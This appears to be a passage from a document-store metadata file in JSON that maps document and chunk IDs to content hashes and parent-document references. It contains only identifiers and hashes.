{"docstore/metadata": {"059dcf25-e5bb-4c79-bd00-be2883db5d71": {"doc_hash": "599d7a13207c550fd2e90fb175c2381f8194b6c9f1e5d28d8e5b644cc6c00e34"}, "464fe239-9900-48a1-9a09-59791200ae63": {"doc_hash": "afbc50dcadea0b8946bf838a5772ac05341c92234242c1aed200774a4685c13f"}, "7f3dbb50-6522-421e-92b1-164565233d86": {"doc_hash": "7affcef0c35a7df873e36ed21778baab3e6f1fc96ffbfb835db797a9ae820d5e"}, "bc58b7b1-a5d7-4260-8acf-4f789b3b2b75": {"doc_hash": "c99f0b097285f2998344e70c6bf6a9258d1641ab1d3a75fa28ed4d5796c0d27f"}, "aaf9ebd8-4ad7-4f07-89be-9f04af239db4": {"doc_hash": "14e66fe0d0c78a1e46abe36e11f5d6ab33ebf652464cdf71b1b9f3a30192a060"}, "ac841265-22a9-430a-8e01-3803f83f66f9": {"doc_hash": "c380caa1f605b616fb052fc1f63c2ec39d273e69fcf38e1fbdf6c23bf4460c79"}, "e00e7ba4-11de-4daf-9d78-d4c8e6289029": {"doc_hash": "6aaf87230254590fd7e44e5840e258225739d66923816fe7a6bb8ad408cd0035"}, "baf4e2dc-007b-47eb-8f06-6b517daa50e4": {"doc_hash": "98a01c991b67e344f316a4069dabc47e763b7caa35f485fdb0baa232fa2b05b1"}, "d11b8a0e-9cb0-46be-8851-c9738964ec1c": {"doc_hash": "5dfde6d25f976370469321f4b6a30f51d233f29c8a1ca242bdf01910a9055cd4"}, "d934de01-b1e8-49dc-8cda-a64ca0a23816": {"doc_hash": "0569143289c3408c2211d92beecabca265304b607fbc5d3bbe1b9ae0b19c242a"}, "a3ab5dfc-6ea5-4a4b-95a3-d5fee4953128": {"doc_hash": "83b7b4686d4567f2d48a1f1870900f12d7a6abfcebc1fcb1762d6c4ac0a99fde"}, "b5e0e9d6-2d0e-485c-9f93-171496c02e66": {"doc_hash": "1c94027dae5675bce42da4bf2b9f56ebacc2221e0a53ecfa8326ef960cdcd4e0"}, "c102483a-9c35-48a9-addb-9fc42ff504c4": {"doc_hash": "994d13887f3eadf77d272f35794ca4031509431f7e72a8111aecc6d056393206"}, "6536a3a7-0601-46f8-9618-3b748bc1f657": {"doc_hash": "cc5c986d6eec0e4de86b5111d5edcfafd4f60b89f5ebd4bab894946540facb7f"}, "e271e3aa-230e-43de-9f6d-d863a8312299": {"doc_hash": "7a715e804d583418e777bd3e7d8be0d6028b7861435381f2d56258941d6421c9"}, "4bbe6897-99da-4eaa-bcf2-eaee9babb827": {"doc_hash": "ba592361c714a612f710385da5e13bd88f83e9cc4f038ac0aa0de0f8ed0e2768"}, "023d277a-eb7f-44aa-bc45-736b77eb9e8b": {"doc_hash": "21f677059b6745d923f43e5261a94abfe83c517dbce172b38e45b4856015cba9"}, "16823b45-b6ef-4128-9ffa-2304de5d83e5": {"doc_hash": "db1246655b2ac9dce7fc1a57937b54f1bebaf53b0257a4a6b82904b1b10a88d2"}, "4d0b0ad4-f993-4b18-bbce-7d5d804d13ab": {"doc_hash": "7510f7ca7f0b23bc3ae2944ecd696ec33918490e6b93780667cfedac09a86f0a"}, "5b2bfec0-7668-43f3-b767-df270b44b271": {"doc_hash": "2e44c579fd0dd4318e17c710a024341de47e3b86d17a623f1820ba06bcec4697"}, "c2a3a186-58d6-4cea-9c71-460ed5ce6531": {"doc_hash": "9285a4dcdbabfd9a52927d431d7f73985bdf2cda34b31a340a50a6f9a78033b9"}, "b0f9bd5f-c05b-4d41-99b9-9d7acde949af": {"doc_hash": "9b295ab0c88415d1b23d2266b09572ef316449847dd766565f6c8145b5c2e283"}, "42410e12-a60a-4737-a944-b2aca4de4282": {"doc_hash": "7d491f408617fbe27b6f2dc06c51558511432f015fad9f1df496c63f1281ee83"}, "920aa792-28cb-4fa9-b09e-72482eededd2": {"doc_hash": "b934a8fb054a00e8a9274ba81407f63dc2fec738876893d24c218ecc0e3e07a9"}, "dadfc12e-71af-4507-8697-d01e17d37f9e": {"doc_hash": "55a7cc9e15cb5b17b6a472b36eb5fe39af254b916ae71c06e6a1e40b0b5e101a"}, "96afaff2-0c9f-4592-ae22-cb2160815cbf": {"doc_hash": "a53ad5c9c142bf6e03ef8d272e09d2e5089e467578c6e602a41da92978936b14"}, "27eb8e21-c697-4749-8f32-5d43a2dbeb0d": {"doc_hash": "b3e103b9ae57a216b229024400b91065786a2b53b240003fa0b83bc14a4714a0"}, "4f454957-0da8-4138-bc5e-10cd78c3aa21": {"doc_hash": "b77c428151e0bd9fc447345e0fe929c377f89634d725990b253b2723e993e567"}, "4e6c12d6-02d1-462d-ad20-be31f3fdeb15": {"doc_hash": "7c7d38b575823fae32ca4989bc0f6e93f8e9839b89c12a79c0c2830a88a6e9a1"}, "1fa24f1e-a3cc-4a19-b774-5389fd9ac055": {"doc_hash": "88142b3d1d66f464a138eeefd8cb028e76477f579e97bec8e0b996d4e6e30acc"}, "1e533b1d-7938-4e8b-95d8-89738d2a994e": {"doc_hash": "92dd82aca5c00ed400d8e5b0f09eb3a4951d5eebb7c9f9a46efc7518b6f0a00d"}, "30980c54-9bb4-40fa-b53d-0f2f50ee0925": {"doc_hash": "43fac2fdb4c01260e916d98988a86f4c44dd2bb867ecc3e422be71c40135f978"}, "8b3472ef-41f3-4fd8-9fbb-1c1d3cee9f79": {"doc_hash": "c526a67d24060491d8e9ccb0dc7520da0cf16874edaaf9707da32e4ff4b4bcdf"}, "6574cb40-9ac3-49ad-9751-81c00736ac61": {"doc_hash": "1e9aa5b01e0c0ac096e74a18f0089b8bc991bd3c387e73d8a8ae57101c75a0c1"}, "b364a1bd-be12-4360-8a87-6afe2ec8003c": {"doc_hash": "2fa06436efa54db696709fb8ad1d4204198fd0790062afcb7690643f04360232"}, "73438241-b85b-4f2a-81d4-ec965df349a4": {"doc_hash": "59e312bddab3bda50c60b8c8ec8399d32b57deb3f7f9cd4413f2e4e31d9811bf"}, "c215f6d6-4245-463d-99d4-966189f3afcc": {"doc_hash": "8eb9fc42075945f192bc48a6d4641524c188357a9eac2e75fbb1749fff1003da"}, "dc8f8c68-ea3a-498f-8325-72d9b4aff3fe": {"doc_hash": "3c1dc0955e5382e2d7d284cda9bcead520b74104682a6cabe7c80af4566652f0"}, "87d5ce76-ecfe-49cd-8d1a-6f70116e8ecc": {"doc_hash": "fc348390ae7373c136017145b62827a321631b231237fffc11b75ad1de157524"}, "f11cb73d-ec59-49e3-8391-7adc4aaccd2c": {"doc_hash": "6b9c8d1231a0d278bae1a891df1ecb535293ebb697103a58ad49137db8042cae"}, "fdb1493f-c273-40b9-ba6e-a9adf26a6d24": {"doc_hash": "cfc38d8880a9c5be1687775fb00a5a7735d66aa0d09dd2871186fea73edcff0e"}, "a8345bde-297f-4740-81c4-df05ce25fe03": {"doc_hash": "cef42f6396e1f2bb524fbda4e3034e09716d596af0899845326d994faaad9524"}, "3b68f9e9-7843-456f-8a25-0233e692a9cc": {"doc_hash": "9c7bb0c7a63021a0a7ec7dfd38c1b7b199bb26b1df6aa431f39536a1e28f4a32"}, "963596af-a032-4fbd-8503-515ddb4fc969": {"doc_hash": "cc50aa70bbaa5a5c14559bf58fb537acb6f69374bc9aade552d9ad9d1c1ce2c1"}, "c7dc7433-d0eb-48e8-acc7-fcec7e76c7b0": {"doc_hash": "eeb6bd66edfad33a27f13b3edf6df1f414d35b8893fca3e276949e73b97b9ba0"}, "18c3ac27-a884-455b-a17a-8d974f54dd18": {"doc_hash": "c1ea257a4fc74723f1e4ec618b221b389ca96b987d014d394ec7c6a57d32eb3b"}, "6b7a3f2a-260e-494b-bba7-0b07c7921c4e": {"doc_hash": "6935989d6be19cd76486d81e21b4dd2a88f7beedf28723b313cb515426d4c503"}, "c302a78e-9a8e-4671-b8b4-6dd2d2ff21dc": {"doc_hash": "95499f4edf09417e2fe79c1568e0e895863583b8473023ca1007302c09548477"}, "c3d1ce14-6cb9-4818-89b6-904575e226cd": {"doc_hash": "dfcff88e279ef31704ecee98f99c2fbc5b84bc90f9fb91b99b1b98b57d67345d"}, "0e41de41-abb0-4146-a3f7-3d568290221f": {"doc_hash": "cab7dac87851ab06f42817b6bc84ee6176483b0569714fbd87b4ff73877a017d"}, "1d5666f6-2915-4572-9244-6b6ecd146d15": {"doc_hash": "cffb952033bbecb9877958840f547097f4fd345c2864c5679ab02e69eaca4357"}, "2b655e01-c3c1-4012-bb8e-22360990e6b0": {"doc_hash": "01778a1eed3624d6c386d3e35de32d03fabb02c7fdc259ba596d851f7e01bd6b"}, "c85d4846-af91-4d6e-a70f-36e1502f6a33": {"doc_hash": "3b03b21c0e5b9dfc10d194c3d17c27bc7630063548b48022f02341f6d7a221a5"}, "4487435c-303a-49c8-9439-b97285067e8e": {"doc_hash": "7bb4495e2164bd6febe2a3798eb75ccde3179473182d3e6d3d3191d67f35e93e"}, "895bab1a-3c52-4817-8561-0fcf869882aa": {"doc_hash": "887f61973cc220bd3d7ab536bff8f8a75c66cc4c97a13084770fa4b18cb538f3"}, "be9c74f3-8935-4ea4-95d2-828c0b360eb5": {"doc_hash": "fe9163df8de72e7abf5272b9ef4110e98e292df597fcb36f95f3ba8d8240ea93"}, "a51f5a34-816a-4051-8e10-150bd3f01e7b": {"doc_hash": "d4fbd186617a8947932dc6b80d6460544db35f471b1515899aa63fd0830731a5"}, "36a35c90-fdda-4d19-a246-184ea7945dad": {"doc_hash": "58e740ae8b45ed31b797f835faf4cffa648338a48f14d9550deeb5bf07562c96"}, "74d9bff8-98af-4bdf-bf8d-bba69cabd6b9": {"doc_hash": "73ed7714202b3bf5140db7bc73214b93710a27373479771c4b9d293d7cbb7c53"}, "96f4886e-da68-4538-8db9-165311fb9b71": {"doc_hash": "931911bc031d4c8640d69ffb016fb71b871ed658c35d8cc3b3d8ef260b4aa668"}, "e85c1ce5-9e61-4cb2-ac5e-3341b93ce5cf": {"doc_hash": "7312a5e40f637db3710821f5fbd1fec5bffb0dc48db9e0634baa1ecb5d853bb8"}, "5a11ab77-d730-4737-97e4-0e94c752af01": {"doc_hash": "dc5400adbe786ad07e6d6d0faf655e00a6cfc5da65f0c68d827bea56bbf7f67c"}, "440cf506-8894-451f-921e-ffd81cb06f82": {"doc_hash": "036be9d68a3d5a52cb4eb3ac22caa33b2467ca2971771af17a937fc3e2913179"}, "6766760c-589c-474f-8ada-3e1995bdfaa1": {"doc_hash": "a38912c10ca101f9f116212e0495fc1e16a1fca40b6a3f63480aed41a47f167a"}, "d2f83b4d-8c77-404f-bc10-3340ce7a5717": {"doc_hash": "a94878b6f1b2d2ff3cd809a74b7be57fba5e220d66146ff4254c03295122e968"}, "a475e062-4680-4817-ada9-8b9172e5d14c": {"doc_hash": "3061a679dec7bf1fbdfd13fd54d124625aec7e1f667f454f630142b96a0aa003"}, "e109ca46-30b3-4a43-99f7-6cdeebb7648f": {"doc_hash": "6a5e87d009ddf4629923951a507a4f47cb46324e0e4687f1dc081d3f4329bd32"}, "b9fa964e-8184-4a91-a33b-114343d438e0": {"doc_hash": "fbfd3e9332cbf1b53eb1ccb8d2eb3826986558a17223d67eeeba645604537edc"}, "1d46afa4-ccc6-421c-9628-d33ca49309fb": {"doc_hash": "84eb0e60a518bd9ce8cba407ac52dc5ab841761c4b70131e64045c3f11e34ec9"}, "e862f6c7-60ae-41c4-9d8f-4b63f4ae461d": {"doc_hash": "193d27637ff413229898f8e15f8807e5efb4b6406812b47fd613cfe494e12c86"}, "732f8371-e2f8-43f4-82e0-c5be41df060d": {"doc_hash": "69f57d526c8341efc12578652bc46c45873e1d7dacc6aeaa6c61559648deed70"}, "00452626-e686-4fd0-aaef-6c94b4a53ecf": {"doc_hash": "313bf282a194991b9324cb536c99b823ac36e7ddc0385908924d6dd337cc5075"}, "356064ba-2a01-45e1-abac-af478c5f5f54": {"doc_hash": "8d9bda161eccb79b8ff0fc0697388f7aaee3148fe723a81b7c6e5d5840da3194"}, "b1e5d45f-7774-43a7-9b9b-e5a1dbe4e42e": {"doc_hash": "0cdb538ce2ae8a4e3793b9d9663e3725c0d6e4ddd8f5a4a7fce680863516683a"}, "2e6ad1d1-039b-4708-8ac5-dd5ec5203b1b": {"doc_hash": "cd6758d5369be12a6b14824c8c62a26c8d68fd2a3f76749799007e16f82561af"}, "3fbc53f0-bb13-44e1-8062-aa37dba76f8f": {"doc_hash": "7c9311110297c1a044c5c11d03f803753d0ac14316a43fab2bdd17524bf6aefd"}, "61d5256c-c6b3-4fc1-bd32-8d00fd981a57": {"doc_hash": "3fab8d2ef2a78e20178f0f2a8f2a821a4190d82f421f6a1f852ca8f5bbd5db6b"}, "c3653e3e-2069-4f89-92dd-13429081a53e": {"doc_hash": "8c9479e094914edcf9991335b4adfd6d3c71be988dfee641f80cce5377b29d5f"}, "57c8e63b-7396-4653-9184-2dd505bd169b": {"doc_hash": "97c7d3eb5df3e2eefb58b6f3bdfbeb02a6e889dc2e9ee515a70548d77a9d7037"}, "990921b8-9814-466f-8b99-54ea64cf0433": {"doc_hash": "970491b50c072c0b7549d8840bfd25de01518bdbd2d5f58ad59fc3c25c3dce91"}, "3f327e6f-f253-4738-9c1a-4374d1f2b733": {"doc_hash": "3fc425d5e59fd9c48f5365f23a58a82700d0be3753ab712c55e7a8fcce879e1f"}, "c3def46c-86ea-43b8-995c-e1ad40596e1f": {"doc_hash": "c220f6c3af3e66dfa4c072d53e505062e3bff75ab18a4f374170ff2ac1a0675e"}, "13cc907c-74a3-4fc1-8a4c-24490254910d": {"doc_hash": "c40363b9c648a24874ddd6c3781795b16af721a0640cdbd07dda8e50d64d98b9"}, "62371b0d-34fc-4266-9a71-71ba1dd09326": {"doc_hash": "4c1f722a1376615cf88488a2b412b789898851fb6a98bcb108e5f857429f8d0a"}, "a859e5e9-8eaf-4a5c-b325-8e83563b3126": {"doc_hash": "805e67e459acc392cb5bb7aadc6dcd1c668dc4d1c3e38646c9fc8472fc46e06b"}, "0612b6c0-3f76-4425-bbea-8928da2a906f": {"doc_hash": "226e3efcd2d06795afb764cb867d61572bd16fe22479eecfae9ec3d2d4e5393c"}, "37f5dcfc-7cb9-45e2-acdb-7551e0e4ac64": {"doc_hash": "f4ca3a7bf599a5fd1320053931302e044aa00bff9112cfd76cc83b25ac6dc3c1"}, "d198b9b6-6405-4299-8c9e-966e575abc01": {"doc_hash": "5c0a04c3a28578980b6c72ef155bfc97b5b18bd55034d7a7b4fb5337e934aec1"}, "ccd9a8a0-1bd6-49b5-871e-9a31e61dabbf": {"doc_hash": "78fc78d2e0b3d8a62ec52543cbf36dba57925055242e9e06f9bf248708f2fb7f"}, "d822a52e-52df-4b79-950a-27c3c5df989a": {"doc_hash": "2f9130ad30b4e60a28b7067c30e50c5103ba8076e005c50fdecb8d39833cd3f2"}, "63db19e4-93f8-4ac9-88a7-d160c4962737": {"doc_hash": "5167fce78b676a1c3441e2e5ab10ed4dd9f79c48a37501fb3f81f12f65a1ef4c"}, "a83b156e-7852-47b7-8349-4f6acd5ebc78": {"doc_hash": "1d4275142f136632733c48cc7c15921c81f4d2403cd1717012744f50ff1f525c"}, "5bd326b8-12b7-4556-8a39-ac4dfac6afc5": {"doc_hash": "03bb9a6bfd251f407daa17962db400574f45bfc719d6c8d304710e152bc85990"}, "93a3a32d-d3bc-4214-96f4-d68090eeae27": {"doc_hash": "a9503cd41b150bc220a969362054527411474c3f99a4eb61fcd459f28c58df74"}, "625ed93f-3c5c-49fe-a7f9-12ba96660f06": {"doc_hash": "5406a85f11ea90ef33d3ed9379cc7643c72ab8261850cf1f9278121347493a00"}, "cbb689e6-69c3-4c32-9c9f-73c3c51c1fcf": {"doc_hash": "d3656ebae57a10982d6254f9aa9ee3af6e919e5c4f8e2924b79c8ec48fa8094c"}, "83672024-a890-4545-b120-740588085375": {"doc_hash": "59a1f4f4efcbd068ae584c96c7bd889e8804c64e82b199d5b4b2ef27ac7339dd"}, "f61f67f4-6fa9-4633-a331-1ce0bbe3bb48": {"doc_hash": "c5de5a4e85f720843a26f0f3a6ca5a09ce6b2ba25a0b22a4fc885a1bd162d7aa"}, "503f42e7-7cfa-4732-b3f4-2d8add9a3581": {"doc_hash": "c533c5fe57929b20207ab6d582ddd126ec7e002b7e1f57afebe44f83d636bbad"}, "82fb0311-8900-45f3-858f-fb8fe32932d4": {"doc_hash": "ccd47f43c65ebb0c2005470142b4074ee8e4ca5e6f3b58b1067c1c00b1f0a54b"}, "5a2c0663-b2bc-4f50-b017-0dbbc82478a1": {"doc_hash": "aec1293c50153cc717899801f0ee7240276a8615aaadc4c57c431c7d7362740d"}, "a8aaacbb-9b9e-4d5b-9ecc-5e935a8a6cb5": {"doc_hash": "db4326ada92bb56d57ea7ba4582d54ce6945203b8644e6ead16523e39469aa77"}, "b5d66284-5809-4926-9c7d-c3f0f6275b03": {"doc_hash": "8ce1c63429533e17bca0e0d36918da18b20540fd4b632b01653191a781ebe894"}, "2e1f6904-858a-482a-921e-3251f8c3c0a2": {"doc_hash": "981e8fbc6fd0f9fae286af6cb8d33bce0dfcf15c006ae15ec04a8526f5c1ac2d"}, "5555f464-dbed-4a52-aa0a-79a3f4a3dee0": {"doc_hash": "28308d62bbd66640bd349f0e911c22594fd66eb42004d42236497340fd34803a"}, "973d3d5e-e131-4c51-b72e-614978dc958b": {"doc_hash": "88d15eee4b20f25bcc8b684c680a75914ca0c29372dbfa66730fd5b3f1587001"}, "ec5b012a-48ca-4a21-b22b-03483fd9d265": {"doc_hash": "55a6efc8d7d4ea76fdd4a1d784cc4d68160966220bde52513c6907a2d73155c9"}, "fe136642-90cd-4683-b2ba-6bb03d9fe89c": {"doc_hash": "8dea4b385bfabc1f287b70cf1b3c1a189e7bca8bb16612fae668b0b2ed042911"}, "3004466a-db38-476d-9d5b-4ee726a038a5": {"doc_hash": "751b753cbfb802fc468947918d83b8a9a0626b95814d0a26989472c149341eff"}, "bd400085-3ca5-4c45-9e82-bf7e70714bfb": {"doc_hash": "959384934228e72875da252477c4299e305d9c7fb444abbd56b306493363928d"}, "ff845f64-3bd1-459b-b866-fb62239cfe5e": {"doc_hash": "61684553d65a558c7cd072e52472ed1ae660a57f25a943e8e5a6a129ce9d5c44"}, "af877349-d564-49f8-9987-efabe2d3866b": {"doc_hash": "9f56194088cc6ad4aadbb7ca6f0603a49f0328754f368a4f0d66fdf48ccc2639"}, "6756cc79-1442-4d55-a76c-b847f8620d42": {"doc_hash": "3dbc006f5d3034301fcb3d407c0cbaa1a45d79402c2aed748d7caa7aace4c1eb"}, "cc13b3fa-6fab-4857-b0f2-776ed395ab0e": {"doc_hash": "d819594d64a7abddbd5eea2bb76c3508df55e7c006fb6f2e13ba20a83609a1a0"}, "232ff45f-7478-40d2-8f8c-6d05c493b2d5": {"doc_hash": "0e741b07892f4f34021b7b85a214b386b442b1cb008e0f5c0d24595e5ae09083"}, "2e36d5de-57f3-4191-b2b0-f727da160a54": {"doc_hash": "4f2bdf4dc522ecce28fb30d23ade117fc89cbe516a3097e19958b7689ec43a12"}, "e6bbdfaa-2896-47f9-9a8d-443630303409": {"doc_hash": "5ded0cf9e530241bca9ef7fbbe631b9062b684a48f2aa4e689f35cae080be719"}, "f57148e9-5935-4d0a-9aa3-7d80f7b2b56d": {"doc_hash": "499e05c4338f9b18266a32db300afa2753a4a5afa04b09c75dd054376d72db47"}, "e5dc82c0-936a-459f-89be-eb1ea21641d2": {"doc_hash": "7a70da84462d259ccea179c32fa5117fe3ae412ddf784f03dfa1205f7fd71797"}, "8042764e-2608-4e52-8407-57d9588f9755": {"doc_hash": "5599fa0963a5a41cda71b59943654af1f0df98125180ef5b2b19a75dae2244c1"}, "88a19300-fbfa-47a5-be03-0185045e4027": {"doc_hash": "e8518ff1f70954b273d117e3cbba1ee73fb874d164b01e49f0166c66a8cf43fb"}, "0e872210-53ae-4825-94de-0be0e4844acd": {"doc_hash": "e6fb87d69eedd70ff8bf67b68e26ba04715d032d5dcd5a3c19c56beaa4d6e1ab"}, "d1eb596a-6e77-4161-8724-3485d090da77": {"doc_hash": "6a971365205f76c8697c7569e0c29399424c00f692984a26cf7608b266ce83c6"}, "865f8cb9-30d4-4db9-ac4f-bbe597873f44": {"doc_hash": "83a3448d1a74aba5c8d773b1cc802aab338c95f19a362310900e0f36b4bcafd8"}, "d8d53b8e-6ac7-446e-8c21-72882030baa4": {"doc_hash": "5b5a30ad508445c520dc48a0b90c66efcc21bb29c2029c15536edf11834da828"}, "d3365039-0c8c-4abc-936c-41861e37317f": {"doc_hash": "6f4bea7802dfffe905c1ac6d97c9e6c2ac20180b0182e6cd5f56d450452bb346"}, "1b0df341-2e51-409d-9add-d67fad62a602": {"doc_hash": "3798646549d6bc1cd9f4da85c4341c4c2184dfb3b94e2cd050b64fcff148aba2"}, "59472fd4-b251-4e36-ae6e-b7185ff88454": {"doc_hash": "33e8fefae47d6e71c51936f79c064f4bdeb3529833f5f33d2bfaef40c59f1504"}, "03d6c74a-702f-4265-91f0-8945e6619169": {"doc_hash": "82d5de4186e693e91dcc0a6bca2d6c3f82bfdec23815021ad461520a9cba752e"}, "2b662e88-abfa-47a4-9143-6343ab6caba7": {"doc_hash": "8fe31b7b227c103034074834c563b997811c0a005ea7a12881163c2bf32dfbaf"}, "19c6cc07-bc14-4fb6-9803-1d2a633e738a": {"doc_hash": "d11a7093996c3390034582431d7c53f4666309e5e4219a5f3cd5fe18b71d7a4f"}, "ddd8b97a-930f-459e-9a76-8e25e285a50f": {"doc_hash": "0c3d13d0466ab00808e22c725030a9cc1b806ab808aca2d4a81a1861bf952ab9"}, "d04f04b0-e1e3-4498-97e5-37ac1e283988": {"doc_hash": "d04396ffdef7917753aef8950302142dce894c7792eb62d2eacd0bccf9c764a9"}, "71bb8e6b-075e-497e-a7ea-fc859f5b9db6": {"doc_hash": "df09ac54b3603d619be4708d52ab302b8c1ce73be0129cc7d208d9241de26f92"}, "5e2c8a10-e17a-4a8e-975d-bb1df73729c8": {"doc_hash": "d789dc18640fd774fc32713069681aab4d3596b0597a5079a1c4e439c2ba1ddb"}, "5f54a15d-120d-400f-9bac-b450145ed972": {"doc_hash": "b05e3733aadd4d545fe86ea8a3754a7b296349b5fe412ac4488bb6ec3cd24756"}, "2d396aa5-d28c-4dbf-98f5-8f56cfeeaf7a": {"doc_hash": "0846d7559f3e8fb379c3e70b0c043ef91e90499cce1a3dd7db5f0fa1ba3d1dfc"}, "959d1046-d11d-437c-9841-c671ee0b9659": {"doc_hash": "78372b6b1051a3a51641d28b4be643013fbfb0388cf9cfad0a0adf3862f8b4ab"}, "24553444-4cde-44cf-beb3-a76982a7ed90": {"doc_hash": "4c31d7a9569d1d70c58e62d34e1a4573f103c4a831c244a2229348c02e35e23a"}, "abd189f8-f5de-463e-9f7d-e4f63822aadc": {"doc_hash": "732adbc30491e93eeadee3d5a125dde973273339e8ceb164a67d7d1e95f5d11e"}, "84c2e511-48ec-47ff-a7e5-23983f681b44": {"doc_hash": "67331705f14a3778299669c4977b87f20ff31dc4360ebfadebbc1e7c7230d7f2"}, "0b0db083-274a-4440-a644-5638d7ee1546": {"doc_hash": "f040f53c09b30a109734420ea1df268ef12a86d79f0de3136d99d95e5b9d7baf"}, "dcf784b6-b3b1-438e-b1ec-fb58eb4100c9": {"doc_hash": "6e0de72b6e463fd73315e098c3058a1f9b1a5b0f3376cd87149b8b3575b668dc"}, "c6f96e53-d21f-4f8e-980c-0291e4e94bf5": {"doc_hash": "eeed8aafb5c2361067f70f403e238aa208a675faefec345858c365ac9b227ba6"}, "e6df4fc4-db7f-4ceb-a609-7c9f924d9212": {"doc_hash": "ebced5c7a6dd95c161152b3a2294a776dcc1df7b8fa284674420bd985e94e47a"}, "1759b7f5-441f-421f-a9fd-2ccffaa785f8": {"doc_hash": "e5919e3bf1db42b7970a53ff82f0fa4b3402069621b8ab41322561be931e7b10"}, "cd9ff649-ec18-4ac9-9da4-274624c4b102": {"doc_hash": "b57cfae5575c219c143f4b2c50379ef1ff041d9a8af2e1733ed9a24a4e0555d9"}, "08c308e0-65ba-4778-8805-e21ca60057f2": {"doc_hash": "1ae4db96510dd9d96645186ef90789f133ed04873791330bf6241ed27ed1a671"}, "8b738493-b7b0-4073-8783-2c1ab2689ce9": {"doc_hash": "d6512f0ae5e50650ed788cc1f6f2ae77e54508f933a827c5103efd3ee3d450dd"}, "14202eba-f4bb-434a-886d-25619c626e97": {"doc_hash": "10548159f2979cf2d7fe6fc1f364dfa9c16537a46aea6d60148f412312e4dffa"}, "f14c65c4-f4e2-4744-a7a8-99617dca79c8": {"doc_hash": "78bacaeea8a737820fa25933ce2645817674ea0afd3e8505dd67f4800e490989"}, "c1dc16ca-dd74-462c-9b49-f30857a804fa": {"doc_hash": "3721cb3daf18da9316521b25de11e7c9662bc414802e6a68392ec7b37477e2ea"}, "072ecfae-aeb3-4841-b622-c8c6b0bcbfc7": {"doc_hash": "fddee8f1264ac6d289b9fa36edd7adbe3a000d199e7f3dd0b7c1963133532de4"}, "057af806-ded4-4385-b535-eebd2b75b0dc": {"doc_hash": "0f3437ba138b458351b4637ab372965139127b498742394f6bf7afd8b84d3ff3"}, "738715f8-1aff-4a43-b245-007bb56d0338": {"doc_hash": "dc0c065710d11d752837a23e3c2ce48d0936b3532b154be093d7d460ff0872b9"}, "cfd969b8-282d-4345-bb68-4aba75a850c9": {"doc_hash": "633555a468f7608a7e663544e03c45792bb2109e93f5739a975693d620380013"}, "43860f7f-ccb0-4ab3-b118-69cbf9b32609": {"doc_hash": "6c97e33ca0a77e4fecbebafe6ebe02b7830ceae6c652185a61904444375fbcc2"}, "d8c9c662-c563-49af-b3c8-51c6634d6511": {"doc_hash": "c1370ae7c64ae952ce05906651f9286897e769b837061fa0ad7a9e1460929c8d"}, "7dbd0a2d-0342-4ea2-8957-ae2c159d5a94": {"doc_hash": "2112b747430e3e061b341a4c4043dfde2d07f896ae177b0b9d76884cf777b207", "ref_doc_id": "059dcf25-e5bb-4c79-bd00-be2883db5d71"}, "68f97c13-9ed6-4d2e-98ae-97db122266ff": {"doc_hash": "21851d51800d897f9d6c83b41c181edc0e37c074d908a76d94285590f8104eb0", "ref_doc_id": "059dcf25-e5bb-4c79-bd00-be2883db5d71"}, "b49f4c2c-01ee-4143-a9ae-a783564b7da0": {"doc_hash": "861278fd79b5abcae9e5a4de98dc616a345f66607df27ffe91947041efd6f0b9", "ref_doc_id": "464fe239-9900-48a1-9a09-59791200ae63"}, "e29c344a-fb84-4718-828f-daa3b04409e2": {"doc_hash": "d7a028d94bcde2c31d72b8999589e4af00eff5ba69ad60146bf2570917fc91cc", "ref_doc_id": "7f3dbb50-6522-421e-92b1-164565233d86"}, "071216a7-284a-4ad7-a17a-2c2d293afacb": {"doc_hash": "e5e6f444a2073a5c30b4fcb836461b16a4bb39d2432723d99c0e50a652df7957", "ref_doc_id": "bc58b7b1-a5d7-4260-8acf-4f789b3b2b75"}, "90d1da6b-fd79-44d6-a706-db4d5688d490": {"doc_hash": "d41a37574a8d94f5fe5a876f7e7ca1f87db66ab3b1d9b1a244b574d679022c78", "ref_doc_id": "aaf9ebd8-4ad7-4f07-89be-9f04af239db4"}, "8ef1328f-faf1-46e9-a781-c59c55778b9f": {"doc_hash": "ed3ff82ba15b82fc138f1cc5a94680accb5a983f94260158b04a3cedfe96bdb5", "ref_doc_id": "ac841265-22a9-430a-8e01-3803f83f66f9"}, "f0b6b36c-8300-4553-b231-dd5126602d68": {"doc_hash": "e24b790212da4c30717c6e5afb023fb01e03c85d2b805a2e6b0366d7993bc5f5", "ref_doc_id": "e00e7ba4-11de-4daf-9d78-d4c8e6289029"}, "0bb5e08a-a226-489c-865d-c2e685b01bc4": {"doc_hash": "7acc838d7b46d172974d2f2a7af0a2c43600e85047712a71e3a9e9dbe284896a", "ref_doc_id": "e00e7ba4-11de-4daf-9d78-d4c8e6289029"}, "70955932-2296-4f0b-9e1e-a9f2f24e83ae": {"doc_hash": "d498ca587a0253eef21747e2e48867827b6db342f0ad5109c11547ca4dc50314", "ref_doc_id": "baf4e2dc-007b-47eb-8f06-6b517daa50e4"}, "a979ac51-a40c-4c11-9120-5c4156a56010": {"doc_hash": "5245134c1cfb4cc3ddebaa5c7b436ee47ca833030354871746dfc45945d1fc4b", "ref_doc_id": "d11b8a0e-9cb0-46be-8851-c9738964ec1c"}, "76e93eaa-730e-4b1d-b399-1c050fb88d26": {"doc_hash": "f25e56f6e311bd6ba863f64e61f387ddc184c47c40f31d932403de7bc165d33c", "ref_doc_id": "d934de01-b1e8-49dc-8cda-a64ca0a23816"}, "14bf42d1-c9d5-4608-be53-63bf6906c1a4": {"doc_hash": "05f0b8c4cde3eddf0c25087afb64539b2c4fe980fc72ef8f22950f3ea8ac012d", "ref_doc_id": "a3ab5dfc-6ea5-4a4b-95a3-d5fee4953128"}, "b172502d-aee8-43ca-90c8-6754e6b3ebab": {"doc_hash": "78c548668d1f2d0db613f60d342ab86cc4f2a2279f2173a34f0b8520916425c3", "ref_doc_id": "b5e0e9d6-2d0e-485c-9f93-171496c02e66"}, "7c8ce9ff-43bb-44c1-be05-e80b05d47e9d": {"doc_hash": "d5ebb7f71b7cd8e32618dc8b754a8c89f9c6d3cebbbf6c8fcf6f611e0854ae97", "ref_doc_id": "c102483a-9c35-48a9-addb-9fc42ff504c4"}, "c41fddaf-0cf5-42ca-9980-39bba487978d": {"doc_hash": "550e5690ea28f16a80e69fc86158b821ec5485afbccf8cafd7f94708c3834cd9", "ref_doc_id": "c102483a-9c35-48a9-addb-9fc42ff504c4"}, "c835a5f4-001a-4664-92d3-0a61980be2e9": {"doc_hash": "27cada8b71de411c199635d71d1d6d0ea0981abf26d823c8c7d5c5c5dba15fda", "ref_doc_id": "6536a3a7-0601-46f8-9618-3b748bc1f657"}, 